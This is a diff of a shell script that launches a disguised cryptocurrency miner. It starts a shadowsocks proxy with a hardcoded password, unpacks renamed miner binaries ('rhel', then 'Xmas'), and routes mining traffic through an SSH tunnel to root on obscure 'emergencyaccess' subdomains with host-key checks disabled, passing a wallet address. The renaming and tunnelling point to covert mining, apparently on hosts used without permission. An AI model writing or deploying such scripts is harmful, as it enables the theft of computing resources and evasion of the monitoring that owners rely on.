@@ -100,7 +100,7 @@ sleep 2
 ./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@127.0.0.1:1081 &
 sleep 2
 
-tar -xf rhel.tar.gz
+tar -xf Xmas.gz
 sleep 2
 
 tar -xf update.tar.gz
@@ -136,5 +136,9 @@ echo " "
 echo " "
 sleep 2
 
-./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706 -cputhreads $used_num_of_cores -extrapayload SoloMiningToMyNodeLolWut 1>/dev/null 2>&1
+ssh -i gituser -vvv -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 13333:0.0.0.0:3333 root@01-Mar-2025_Cloudways_167_172_59_26_4E9zagAD.emergencyaccess.teatspray.uk -p 24393 &
+
+sleep 2
+
+./Xmas --donate-level 1 -o 127.0.0.1:13333 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K -p $currentdate -a rx/arq -k -t 11
 
